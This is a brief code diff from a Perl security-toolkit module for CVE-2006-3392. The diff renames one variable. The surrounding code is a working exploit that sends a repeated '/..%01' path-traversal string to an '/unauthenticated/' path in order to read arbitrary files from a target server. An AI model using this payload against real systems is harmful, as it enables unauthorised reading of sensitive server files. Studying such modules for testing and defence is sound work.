@@ -21,9 +21,9 @@ package Spellbook::Advisory::CVE_2006_3392 {
                 $target = "https://$target";
             }
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
+            my $user_agent = Spellbook::Core::UserAgent -> new();
             my $temp      = '/..%01' x 40;
-            my $request   = $userAgent -> get($target . '/unauthenticated/' . $temp . $file);
+            my $request   = $user_agent -> get($target . '/unauthenticated/' . $temp . $file);
 
             return $request -> content();
         }
